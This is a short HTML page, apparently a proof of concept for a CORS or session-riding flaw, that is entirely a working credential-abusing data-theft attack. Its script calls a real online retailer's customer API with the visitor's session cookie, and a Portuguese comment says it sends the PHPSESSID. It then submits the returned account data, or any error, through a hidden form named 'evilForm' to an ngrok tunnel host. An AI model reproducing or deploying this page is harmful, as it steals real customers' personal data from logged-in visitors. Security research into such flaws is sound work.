<!DOCTYPE html>
<html>
<body>
    <form id="evilForm" method="POST" action="https://7766-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app/">
        <input type="hidden" name="data">
    </form>
    <script>
        fetch("https://www.boozt.com/at/de-at/api/customer", {
            method: "GET",
            credentials: "include" // Envia o PHPSESSID
        })
        .then(response => {
            if (!response.ok) throw new Error("Erro: " + response.status);
            return response.json();
        })
        .then(data => {
            // Preencher o campo hidden e submeter o formulÃ¡rio
            document.querySelector("input[name=data]").value = JSON.stringify(data);
            document.getElementById("evilForm").submit();
        })
        .catch(error => {
            // Logar o erro no servidor Go
            document.querySelector("input[name=data]").value = JSON.stringify({ error: error.message });
            document.getElementById("evilForm").submit();
        });
    </script>
</body>
</html>
